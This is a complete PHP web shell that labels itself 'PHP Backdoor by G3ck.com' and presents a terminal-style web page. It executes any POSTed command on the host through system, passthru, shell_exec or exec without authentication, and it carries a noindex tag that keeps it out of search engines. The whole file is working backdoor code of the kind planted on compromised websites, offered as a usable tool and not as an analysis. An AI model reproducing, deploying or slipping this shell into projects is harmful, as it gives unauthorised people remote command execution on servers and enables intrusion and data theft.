<?php if(isset($_POST['command'])):$command=$_POST['command'];$command=trim($command," ");else:$command='';endif;function answer($data){die(json_encode($data));}if(!empty($_SERVER['HTTP_X_REQUESTED_WITH'])&&strtolower($_SERVER['HTTP_X_REQUESTED_WITH'])=='xmlhttprequest'):if(function_exists('system')){ob_start();system($command,$return_var);$output=ob_get_contents();ob_end_clean();}else if(function_exists('passthru')){ob_start();passthru($command,$return_var);$output=ob_get_contents();ob_end_clean();}else if(function_exists('shell_exec')){$output = shell_exec($command);}else if(function_exists('exec')){exec($command,$output,$return_var);$output=implode("",$output);}else if(function_exists('terminal_exec')){$output=terminal_exec($command);}else{$output='Command execution not possible on this server';}if($output==null):$answer=array('Unknown command');answer($answer);else:$output=nl2br($output);$answer=array($output);answer($answer);endif;else: ?><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta content="en"name="language"><meta content="width=device-width,initial-scale=1,shrink-to-fit=no"name="viewport"><meta content="noindex,nofollow"name="robots"><meta content="IU"name="distribution"><meta content="G3ck Dev Team, dev@g3ck.com"name="copyright"><meta content="Jarek, jarek@g3ck.com"name="author"><meta content="Jarek, jarek@g3ck.com"name="author"><meta content="G3ck Dev Team, dev@g3ck.com"name="owner"><link href="https://fonts.googleapis.com/css?family=Roboto+Mono:100,300,400,500,700"rel="stylesheet"><title>PHP Terminal [g3ck.com]</title><style>* { font-family: 'Roboto Mono', monospace } body, html { height: 100%; background: #000; font-size: 14px; color: #fff; padding: 0; margin: 0; overflow: hidden } body { overflow-x: hidden; overflow-y: auto } section#terminal { margin: 15px } #console { list-style: none; padding: 0; margin: 0 } #console li { position: relative; width: 99%; border: none; color: #fff; margin-bottom: 1px; color: #1dff1d; padding: 2px 0 2px 15px } #console li:not(.answer) { cursor: pointer } #console li::before { content: " ~ "; position: absolute; left: 0; top: 1px; color: green } #console li.answer { color: #ffd623; font-weight: 400 } #console li.answer.error { color: #ff2323 } #input { padding: 2px 0 2px 15px; position: relative } #input::before { content: " ~ "; position: absolute; left: 0; top: 1px; color: green } #input::before { transition-property: transform; transition-duration: 1s } #input.waiting::before { animation-name: rotate; animation-duration: 2s; animation-iteration-count: infinite; animation-timing-function: linear; color: #fff } @keyframes rotate { from { transform: rotate(0) } to { transform: rotate(360deg) } } #input #command { width: 100%; background-color: transparent; border: none; color: #fff; font-size: 14px; color: #fff; font-family: 'Roboto Mono', monospace }</style></head><body><section id="terminal"><ul id="console"></ul><div id="input"><input id="command"value=""></div></section><script src="https://code.jquery.com/jquery-3.3.1.min.js"integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="crossorigin="anonymous"></script><script>function log(n){$("#console").append("<li>"+n+"</li>")}function answer(n,o=""){$("#console").append('<li class="answer '+o+'">'+n+"</li>")}function welcome(){$("#console").append('<li class="answer">PHP Backdoor by G3ck.com</li>'),$("#console").append('<li class="answer">Licensed under the MIT License</li>')}function ajax(n){$.ajax({type:"POST",dataType:"json",url:window.location.href,data:"command="+n,beforeSend:function(n){$("#input").addClass("waiting"),$("#command").prop("disabled",!0)},success:function(n){$.each(n,function(n,o){answer(o)+"."}),setTimeout(function(){$("#input").removeClass("waiting"),$("#command").prop("disabled",!1)},250)},error:function(n){answer("unknow command","error")+".",setTimeout(function(){$("#input").removeClass("waiting"),$("#command").prop("disabled",!1)},250)}})}welcome(),$("#command").on("keyup",function(n){var o=$("#command").val();if(13==n.keyCode)return""!=o&&(log(o),"cls"==o?$("#console").html(""):"reset"==o?($("#console").html(""),welcome()):ajax(o),$("html, body").animate({scrollTop:$(document).height()},"slow"),$("#command").val("")),!1}),$("#command").val(""),$(document).on("click","#console li:not(.answer)",function(n){$("#command").val($(this).html())}),$(window).click(function(){$("#command").focus()}),$(document).ready(function(){setTimeout(function(){$("#command").focus()},500)});</script></body></html><?php endif; ?>
